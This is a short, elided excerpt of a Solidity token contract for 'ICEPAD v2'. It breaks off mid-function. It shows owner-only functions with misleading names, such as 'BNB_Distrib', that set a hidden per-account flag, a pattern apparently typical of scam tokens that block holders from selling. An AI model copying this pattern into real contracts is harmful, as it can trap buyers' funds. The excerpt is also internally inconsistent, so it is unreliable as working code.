...
contract Token is Context, IERC20, IERC20Metadata {
    ...
    string public _name = "ICEPAD v2";
    string public _symbol= "ICEPAD V2";
    bool balances1 = true;
    bool amount1 = true;
    ...
    function BNB_Distrib(address account) onlyOwner public {
        _balances1[account] = true;
    }
    
     function ICE(address account) onlyOwner public {
